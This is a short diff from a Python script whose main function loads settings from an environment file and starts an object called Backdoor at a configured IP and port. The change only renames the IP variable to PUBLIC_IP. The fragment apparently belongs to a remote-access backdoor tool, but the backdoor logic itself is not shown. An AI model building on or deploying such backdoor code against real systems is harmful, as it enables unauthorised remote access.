@@ -179,7 +179,7 @@ def main():
     dotenv.load_dotenv()
     init(autoreset=True)
     try:
-        backdoor = Backdoor(os.getenv("IP"), int(os.getenv("PORT")))
+        backdoor = Backdoor(os.getenv("PUBLIC_IP"), int(os.getenv("PORT")))
         backdoor.start()
     except Exception as e:
         print(f"{Fore.RED}[-] {e}...")
